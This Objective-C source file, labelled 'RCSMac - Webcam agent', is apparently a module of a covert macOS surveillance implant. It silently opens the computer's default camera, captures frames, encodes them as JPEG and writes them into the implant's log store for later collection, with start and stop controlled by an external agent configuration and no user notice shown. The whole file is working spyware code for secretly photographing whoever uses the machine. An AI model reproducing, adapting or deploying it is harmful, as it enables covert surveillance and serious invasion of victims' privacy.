/*
 * RCSMac - Webcam agent
 *
 *
 * Created by Massimo Chiodini on 05/08/2009
 *
 * Copyright (C) HT srl 2009. All rights reserved
 *
 */

#import <ApplicationServices/ApplicationServices.h>

#import "RCSMAgentWebcam.h"
#import "RCSMConfManager.h"

#import "RCSMLogger.h"
#import "RCSMDebug.h"

#define BREAK_AND_FREE(x) {if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP) \
                          {if(x != nil) [(NSAutoreleasePool *)x release];break;}}

#define BREAK_AND_FREE_CV(x)  {if ([mAgentConfiguration objectForKey: @"status"] == AGENT_STOP) \
                              {if(x != nil) [(NSAutoreleasePool *)x release];\
                              @synchronized(self) \
                              {if(mCurrentImageBuffer) CVBufferRelease(mCurrentImageBuffer);mCurrentImageBuffer=NULL;}\
                              break;}}
                              
static __m_MAgentWebcam *sharedAgentWebcam = nil;

@interface __m_MAgentWebcam (hidden)

- (BOOL)_initSession;
- (BOOL)_releaseSession;
- (BOOL)_startSession;
- (BOOL)_stopSession;
- (BOOL)_startGrabImageWithFrame: (int)nFrame every: (int)seconds;
- (void)captureOutput: (QTCaptureOutput *)captureOutput 
  didOutputVideoFrame: (CVImageBufferRef)videoFrame 
     withSampleBuffer: (QTSampleBuffer *)sampleBuffer 
       fromConnection: (QTCaptureConnection *)connection;

@end

@implementation __m_MAgentWebcam (hidden)

- (BOOL)_initSession
{
  NSError *error;
  
  mCaptureSession = [[QTCaptureSession alloc] init];
  mDevice = [QTCaptureDevice defaultInputDeviceWithMediaType:QTMediaTypeVideo];
  
  if (![mDevice open: &error]) 
    {
#ifdef DEBUG_WEBCAM
      if (error != nil)
        infoLog(@"initSession: device open - %@", [error localizedDescription]);
      else
        infoLog(@"initSession: device open [error unknow]");
#endif
      return NO;
    }
  
#ifdef DEBUG_WEBCAM
  if ([mDevice isOpen] == YES)
    infoLog(@"initSession: device is open");
  else
    infoLog(@"initSession: device is closed");
#endif
  
  mCaptureDeviceInput = [[QTCaptureDeviceInput alloc] initWithDevice: mDevice];
  
  @synchronized(self)
    {
      if (![mCaptureSession addInput: mCaptureDeviceInput
                               error: &error]) 
        {
#ifdef DEBUG_WEBCAM
      if(error != nil ) 
        infoLog(@"initSession: adding input device - %@", [error localizedDescription]);
      else
        infoLog(@"initSession: adding input device [error unknow]");
#endif    
          return NO;
        }
    }
  
  mCaptureDecompressedVideoOutput = [[QTCaptureDecompressedVideoOutput alloc] init];
  
  if ([mCaptureDecompressedVideoOutput delegate] != self)
    [mCaptureDecompressedVideoOutput setDelegate: self];
  
  @synchronized(self) 
    {
      if (![mCaptureSession addOutput: mCaptureDecompressedVideoOutput
                                error: &error]) 
        {
#ifdef DEBUG_WEBCAM
        if(error != nil )
          infoLog(@"initSession: adding video output - %@", [error localizedDescription]);
        else
          infoLog(@"initSession: adding video output [error unknow]");
#endif    
          return NO;
        }
    }
  
  return YES;
}

- (BOOL)_releaseSession
{
  [mCaptureDecompressedVideoOutput release];
  [mCaptureDeviceInput release];
  [mCaptureSession release];
  [mDevice close];
  
  mImageGrabbed = NO;
  mCaptureSession = nil;
  mDevice = nil;
  mCaptureDeviceInput = nil;
  mCaptureDecompressedVideoOutput = nil;
  
  return YES;
}

- (BOOL)_startSession
{
  [mCaptureSession startRunning];
  
  if ([mCaptureSession isRunning] == NO) 
    return NO;
  
  return YES;
}

- (BOOL)_stopSession
{
  [mCaptureSession stopRunning];
  
  while([mCaptureSession isRunning] == YES) 
    usleep(1000);
  
  return YES;
}

- (BOOL)_startGrabImageWithFrame: (int)nFrame
                           every: (int)seconds
{ 
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  int count = 0;

  while (count++ < nFrame || nFrame == 0) 
    {
      NSAutoreleasePool *innerPool = [[NSAutoreleasePool alloc] init];
    
      if ([self _startSession] == NO) 
        {
          @synchronized(self)
            {
              if (mCurrentImageBuffer)
                CVBufferRelease(mCurrentImageBuffer);
              mCurrentImageBuffer = NULL;
            }
          [innerPool release];
          break;
        }
        
      while (mImageGrabbed == NO)
        {
          BREAK_AND_FREE(nil);
          usleep(10000);
        }

      if ([self _stopSession] == NO) 
        {
          @synchronized(self)
          {
            if (mCurrentImageBuffer)
              CVBufferRelease(mCurrentImageBuffer);
            mCurrentImageBuffer = NULL;
          }
          [innerPool release];
          break;
        }
        
      BREAK_AND_FREE_CV(innerPool);
      
      if (mCurrentImageBuffer == NULL)
        {
          [innerPool release];
          break;
        }
        
      NSBitmapImageRep *bitmap = [[NSBitmapImageRep alloc] 
                                  initWithCIImage: [CIImage imageWithCVImageBuffer: mCurrentImageBuffer]];
      NSData *dataBitmap = [bitmap representationUsingType: NSJPEGFileType
                                                properties: nil];    
      NSMutableData *dataImage = [[NSMutableData alloc] initWithData: dataBitmap];
      
#ifdef DEBUG_WEBCAM_
      time_t uTime;
      time(&uTime);
      
      NSString *image_filename = [NSString stringWithFormat: @"/tmp/webcam-%.16X.jpg", uTime];
      [dataImage writeToFile: image_filename atomically: NO];
      infoLog(@"startGrabImageWitFrame: frame %d grabbed! frame ptr = 0x%x", i, mCurrentImageBuffer);
#endif
      
      __m_MLogManager *logManager = [__m_MLogManager sharedInstance];
      BOOL success = [logManager createLog: AGENT_CAM
                               agentHeader: nil
                                 withLogID: 0];
      
      if (success == TRUE)
        {
          if ([logManager writeDataToLog: dataImage
                                forAgent: AGENT_CAM
                               withLogID: 0] == TRUE)
            {
#ifdef DEBUG_WEBCAM
              infoLog(@"data written correctly");
#endif
            }
          
          [logManager closeActiveLog: AGENT_CAM
                           withLogID: 0];
        }
      
      [dataImage release];
      [bitmap release];
 
      @synchronized(self)
        {
          if (mCurrentImageBuffer)
            CVBufferRelease(mCurrentImageBuffer);
          mCurrentImageBuffer = NULL;
          
          mImageGrabbed = NO;
        }

      [innerPool release];
    
      for(int sc=0; sc < seconds; sc++)
        {
          BREAK_AND_FREE(nil);
          sleep(1);
        }
    }
    
  [outerPool release];
 
  return YES;  
}

- (void)captureOutput: (QTCaptureOutput *)captureOutput 
  didOutputVideoFrame: (CVImageBufferRef)videoFrame 
     withSampleBuffer: (QTSampleBuffer *)sampleBuffer 
       fromConnection: (QTCaptureConnection *)connection
{  
  if (videoFrame == nil )
    return;
  
  if (mImageGrabbed == YES)
    return;
  
  @synchronized(self)
    {
      CVBufferRetain(videoFrame);
      mCurrentImageBuffer = videoFrame;
      mImageGrabbed = YES;
    }
}

@end

@implementation __m_MAgentWebcam

+ (__m_MAgentWebcam *)sharedInstance
{
  @synchronized(self)
  {
    if (sharedAgentWebcam == nil)
      {
        //
        // Assignment is not done here
        //
        [[self alloc] init];
      }
  }
  
  return sharedAgentWebcam;
}

+ (id)allocWithZone: (NSZone *)aZone
{
  @synchronized(self)
  {
    if (sharedAgentWebcam == nil)
      {
        sharedAgentWebcam = [super allocWithZone: aZone];
        
        //
        // Assignment and return on first allocation
        //
        return sharedAgentWebcam;
      }
  }
  
  // On subsequent allocation attemps return nil
  return nil;
}

- (id)copyWithZone: (NSZone *)aZone
{
  return self;
}

- (id)retain
{
  return self;
}

- (unsigned)retainCount
{
  // Denotes an object that cannot be released
  return UINT_MAX;
}

- (void)release
{
  // Do nothing
}

- (id)autorelease
{
  return self;
}

- (id)init
{
  Class myClass = [self class];
  
  @synchronized(myClass)
  {
    if (sharedAgentWebcam != nil)
      {
        self = [super init];
        
        if (self != nil)
          {
            sharedAgentWebcam = self;
            mImageGrabbed = NO;
            mCurrentImageBuffer = NULL;
            mCaptureSession = nil;
            mDevice = nil;
            mCaptureDeviceInput = nil;
            mCaptureDecompressedVideoOutput = nil;
          }
      }
  }
  
  return sharedAgentWebcam;
}

- (void)start
{
  NSAutoreleasePool *outerPool = [[NSAutoreleasePool alloc] init];

  [mAgentConfiguration setObject: AGENT_RUNNING forKey: @"status"];
                          
  if ([self _initSession] == YES)
    {
      if ([self _startGrabImageWithFrame: 1 every: 0] == YES)
        {
#ifdef DEBUG_WEBCAM
          infoLog(@"Webcam grabbing done!");
#endif
        }

      [self _releaseSession];
    }
  
  [mAgentConfiguration setObject: AGENT_STOPPED forKey: @"status"];
  
  [outerPool release];
}

- (BOOL)stop
{
  int internalCounter = 0;
  
  [mAgentConfiguration setObject: AGENT_STOP forKey: @"status"];
  
  while ([mAgentConfiguration objectForKey: @"status"] != AGENT_STOPPED &&
         internalCounter <= MAX_STOP_WAIT_TIME)
    {
      internalCounter++;
      usleep(100000);
    }
  
  return YES;
}

- (BOOL)resume
{
  return YES;
}

#pragma mark -
#pragma mark Getter/Setter
#pragma mark -

- (void)setAgentConfiguration: (NSMutableDictionary *)aConfiguration
{
  if (aConfiguration != mAgentConfiguration)
    {
      [mAgentConfiguration release];
      mAgentConfiguration = [aConfiguration retain];
    }
}

- (NSMutableDictionary *)mAgentConfiguration
{
  return mAgentConfiguration;
}

@end
